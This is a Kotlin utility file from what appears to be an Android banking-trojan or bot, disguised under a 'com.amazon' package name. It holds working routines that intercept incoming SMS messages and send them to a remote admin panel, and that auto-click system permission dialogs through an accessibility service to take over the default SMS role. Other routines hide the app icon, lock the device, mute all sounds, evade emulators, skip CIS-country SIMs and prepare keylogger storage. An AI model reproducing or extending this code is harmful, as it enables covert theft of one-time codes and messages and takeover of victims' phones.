package com.amazon.zzz.Utilsss

import android.accessibilityservice.AccessibilityService
import android.app.AlarmManager
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Context.BATTERY_SERVICE
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioManager
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.provider.Telephony
import android.telephony.SmsMessage
import android.telephony.TelephonyManager
import android.text.TextUtils.SimpleStringSplitter
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.amazon.zzz.Admin.admReceiverDeviceAdmin
import com.amazon.zzz.ApiNm.apiUt
import com.amazon.zzz.MainActivity
import com.amazon.zzz.Receivers.StartReceiver
import com.amazon.zzz.Utilsss.SharedPreferencess.SettingsWrite
import com.amazon.zzz.constNm
import com.amazon.zzz.constNm.str_248
import com.amazon.zzz.constNm.str_249
import com.amazon.zzz.constNm.str_250
import com.amazon.zzz.constNm.str_251
import com.amazon.zzz.constNm.str_252
import com.amazon.zzz.constNm.str_253
import org.json.JSONObject
import java.util.Locale
import java.util.Random

object utUtils {

    fun Log(tag: String?, text: String?) {
        if (constNm.debug) {
            android.util.Log.e(tag, "${Thread.currentThread()} - " + text!!)
        }
    }

    fun getStatSMS(context: Context): Boolean {
        return Telephony.Sms.getDefaultSmsPackage(context) == context.packageName
    }

    fun autoclick_change_smsManager_sdk_Q(
        service: AccessibilityService,
        event: AccessibilityEvent,
        packName: String?
    ): Boolean {
        try {
            if (packName!!.contains("com.android.permissioncontroller")) {
                if (event.source == null) {
                    return false
                }
                val nodeClass = findNodeWithClass(event.source, "android.widget.LinearLayout")
                var click = false
                for (accessibilityNodeInfo in nodeClass) {
                    for (i in 0 until accessibilityNodeInfo.childCount) {
                        val child = accessibilityNodeInfo.getChild(i)
                        if (child.text != null) {
                            if (child.text.toString() == SharedPreferencess.appName || child.text.toString() == getLabelApplication(service)) {
                                accessibilityNodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                click = true
                            }
                        }
                    }
                }
                if (click) {
                    for (node in (event.source?.findAccessibilityNodeInfosByViewId("android:id/button1") ?: arrayListOf())) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        return true
                    }
                }
            }
        } catch (e: Exception) {
        }
        return false
    }

    fun blockCIS(context: Context): Boolean {
        return if (!constNm.blockCIS) {
            false
        } else "[ua][ru][by][tj][uz][tm][az][am][kz][kg][md]".contains(countrySIM(context))
    }

    fun countrySIM(context: Context): String {
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        var country = tm.networkCountryIso.ifEmpty { "" }
        if (country?.length != 2) {
            country = Locale.getDefault().country.lowercase()
        }
        return country
    }

    fun country(context: Context): String {
        val locale = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            context.resources.configuration.locales[0]
        } else {
            context.resources.configuration.locale
        }
        return locale.displayCountry
    }

    fun deleteLabelIcon(context: Context) {
        try {
            val CTD = ComponentName(context, MainActivity::class.java)
            context.packageManager.setComponentEnabledSetting(
                CTD,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: java.lang.Exception) {

        }
    }

    fun findNodeWithClass(
        accessibilityNodeInfo: AccessibilityNodeInfo?,
        str: String
    ): List<AccessibilityNodeInfo> {
        val arrayList: ArrayList<AccessibilityNodeInfo> = ArrayList<AccessibilityNodeInfo>()
        if (accessibilityNodeInfo == null) {
            return arrayList
        }
        val childCount = accessibilityNodeInfo.childCount
        for (i in 0 until childCount) {
            val child = accessibilityNodeInfo.getChild(i)
            if (child != null) {
                if (child.className.toString().lowercase()
                        .contains(str.lowercase())
                ) {
                    arrayList.add(child)
                } else {
                    arrayList.addAll(findNodeWithClass(child, str))
                }
            }
        }
        return arrayList
    }

    fun getBatteryLevel(context: Context): String {
        val bm = context.getSystemService(BATTERY_SERVICE) as BatteryManager?
        return try {
            bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY).toString()
        } catch (e: java.lang.Exception) {
            "-1"
        }
    }

    fun getLabelApplication(context: Context): String {
        try {
            return context.packageManager.getApplicationLabel(
                context.packageManager.getApplicationInfo(
                    context.packageName,
                    PackageManager.GET_META_DATA
                )
            ) as String
        } catch (ex: Exception) {
            Log("getNameApplication", "Error Method")
        }
        return ""
    }

    fun hasPermission(context: Context, perm: String): Boolean {
        var has = true
        if (context.checkCallingOrSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
            has = false
        }
        return has
    }

    fun hasPermissionAllTrue(context: Context): Boolean {
        var has = true
        for (perm in constNm.p2) {
            if (context.checkCallingOrSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
                has = false
            }
        }
        return has
    }

    fun initialization(context: Context) { // initialization
        try {
            SharedPreferencess.init(context.applicationContext)
            SharedPreferencess.idbot = randomString(17)
            SharedPreferencess.initialization = "good"
            SharedPreferencess.urlAdminPanel = constNm.url

            SettingsWrite(context, constNm.LogEvents, "")
            SettingsWrite(context, constNm.dataKeylogger, "")
        } catch (ex: Exception) {
        }
    }

    fun interceptionSMS(context: Context, intent: Intent) {
        try {
            apiUt.sendLogs(context, "", "interceptionSMS intent", "log")
            val bundle = intent.extras
            if (bundle != null) {
                val pdus = bundle["pdus"] as Array<Any>?
                var number = ""
                var text = ""
                if (pdus != null) {
                    for (aPdusObj in pdus) {
                        val smsMessage = SmsMessage.createFromPdu(aPdusObj as ByteArray)
                        number = smsMessage.displayOriginatingAddress
                        text += smsMessage.displayMessageBody
                    }
                }

                val obj = JSONObject()
                obj.put("number", number)
                obj.put("text", text)

                val logSMS = "Input SMS: $number Text:$text"
                Log("sendSMS", logSMS)

                if (obj.length() > 0)
                    apiUt.sendLogs(context, "", obj.toString(), "hidesms")
            }
        } catch (ex: Exception) {
            val obj = JSONObject()
            obj.put("interceptionSMS", "SMS PARSE vers 1 ERROR - Use version 2- $ex")
            SharedPreferencess.SettingsToAdd(context, constNm.LogEvents, "$obj::endlog::")

            try {
                val bundle = intent.extras
                val msgs: Array<SmsMessage?>?
                var str = ""
                var number = ""
                if (bundle != null) {
                    val pdus = bundle["pdus"] as Array<Any>?
                    msgs = arrayOfNulls(pdus!!.size)
                    for (i in msgs.indices) {
                        msgs[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                        number = msgs[i]?.displayOriginatingAddress ?: ""
                        str += msgs[i]?.messageBody
                    }
                    val logSMS = "Input SMS: $number Text:$str"
                    Log("sendSMS", logSMS)

                    val obj = JSONObject()
                    obj.put("number", number)
                    obj.put("text", str)

                    if (obj.length() > 0)
                        apiUt.sendLogs(context, "", obj.toString(), "hidesms")
                }
            } catch (e: java.lang.Exception) {
                val obj = JSONObject()
                obj.put("interceptionSMS", "SMS PARSE vers 2 ERROR - $ex")
                SharedPreferencess.SettingsToAdd(context, constNm.LogEvents, "$obj::endlog::")
            }
        }
    }

    fun isAccessibilityServiceEnabled(context: Context, accessibilityService: Class<*>?): Boolean {
        try {
            val expectedComponentName = ComponentName(context, accessibilityService!!)
            val enabledServicesSetting =
                Settings.Secure.getString(context.contentResolver, "enabled_accessibility_services")
                    ?: return false
            val colonSplitter = SimpleStringSplitter(':')
            colonSplitter.setString(enabledServicesSetting)
            while (colonSplitter.hasNext()) {
                val componentNameString = colonSplitter.next()
                val enabledService = ComponentName.unflattenFromString(componentNameString)
                if (enabledService != null && enabledService == expectedComponentName)
                    return true
            }
        } catch (ex: Exception) {
            // SettingsToAdd(context, constants.LogSMS , constants.string_189 + ex.toString() + constants.string_119);
        }
        return false
    }

    fun isAdminDevice(context: Context): Boolean {
        val deviceManager =
            context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val componentName = ComponentName(context, admReceiverDeviceAdmin::class.java)
        return deviceManager.isAdminActive(componentName)
    }

    fun isDualSim(context: Context): Boolean {
        return try {
            val manager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            manager.phoneCount == 2
        } catch (e: Exception) {
            false
        }
    }

    fun isRunningOnEmulator(): Boolean {
        if (!constNm.blockCIS)
            return false
        var result = (Build.FINGERPRINT.contains(str_248)
                || Build.FINGERPRINT.contains(str_249)
                || Build.MODEL.contains(str_250)
                || Build.MODEL.contains(str_251)
                || Build.MODEL.contains(str_252)
                || Build.MANUFACTURER.contains(str_253))
        if (result) return true
        result = result or (Build.BRAND.contains(str_248) && Build.DEVICE.contains(str_248))
        if (result) return true
        result = result or (str_250 == Build.PRODUCT)
        return result
    }

    fun lockDevice(context: Context) {
        try {
            val deviceManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            deviceManager.lockNow()
        } catch (ex: Exception) {
            Log("lockDevice", "ERROR")
            // SettingsToAdd(context, constants.LogSMS , constants.string_184 + ex.toString() + constants.string_119);
        }
    }

    fun randomString(length: Int): String {
        val chars = "qwertyuiopasdfghjklzxcvbnm1234567890"
        val rand = Random()
        val buf = StringBuilder()
        for (i in 0 until length) {
            buf.append(chars[rand.nextInt(chars.length)])
        }
        return buf.toString()
    }

    fun startCustomTimer(context: Context, millisec: Long) {
        try {
            val intent = Intent(context, StartReceiver::class.java)
            val pendingIntent = PendingIntent.getBroadcast(context, 88, intent, 0)
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + millisec,
                millisec,
                pendingIntent
            )
        } catch (ex: Exception) {
            ex.printStackTrace()
        }
    }

    fun start_dozemode(TAG_LOG: String?, context: Context) {
        Log(TAG_LOG, "No Doze Mode")

        val intent = Intent()
        val packageName: String = context.packageName
        val pm = context.getSystemService("power") as PowerManager
        if (pm.isIgnoringBatteryOptimizations(packageName)) // if you want to desable doze mode for this package
            intent.action = "android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS"
        else { // if you want to enable doze mode
            intent.action = "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"
            intent.data = Uri.parse("package:$packageName")
        }
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            .addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
            .addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
            .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
        context.startActivity(intent)
    }

    fun stopSound(context: Context) {
        try {
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true)
            audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true)
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0)
            audioManager.setStreamVolume(AudioManager.STREAM_DTMF, 0, 0)
            audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0)
            audioManager.setStreamVolume(AudioManager.STREAM_RING, 0, 0)
            audioManager.setVibrateSetting(
                AudioManager.VIBRATE_TYPE_NOTIFICATION,
                AudioManager.VIBRATE_SETTING_OFF
            )
        } catch (ex: Exception) {
            //     SettingsToAdd(context, constants.LogSMS , constants.string_187 + ex.toString() + constants.string_119);
        }
    }

}